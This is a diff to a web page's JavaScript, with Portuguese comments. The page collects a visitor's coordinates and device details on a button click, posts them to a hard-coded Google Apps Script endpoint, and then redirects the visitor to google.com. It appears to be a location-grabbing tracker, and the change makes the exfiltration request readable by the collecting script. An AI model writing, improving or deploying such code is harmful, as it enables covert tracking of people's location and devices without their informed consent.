@@ -50,9 +50,10 @@
   const msg = document.getElementById('msg');
   const coordsEl = document.getElementById('coords');
 
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwdZ3Gwww7Nq0J8VC2pt90kUK7QHUwi4snERL_zWHqUJdRydVBqicYr58NBlqulgjI4/exec';
+  // ✅ Sua URL do Apps Script já configurada
+  const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwdZ3Gwww7Nq0J8VC2pt90kUK7QHUwi4snERL_zWHqUJdRydVBqicYr58NBlqulgjI4/exec';
 
-  // Para onde redirecionar após autorizar (pode ser qualquer site)
+  // Para onde redirecionar após autorizar
   const DESTINO = 'https://www.google.com';
 
   btn.addEventListener('click', async () => {
@@ -102,13 +103,15 @@
           Memoria: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A'
         };
 
-        // Envia para o Google Apps Script
+        // Codifica o payload como x-www-form-urlencoded (formato que o Apps Script lê)
+        const formData = new URLSearchParams(payload);
+
         try {
           await fetch(SCRIPT_URL, {
             method: 'POST',
-            mode: 'no-cors', // necessário para Apps Script
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: formData.toString()
           });
           msg.textContent = 'Dados registrados! Redirecionando...';
         } catch (e) {
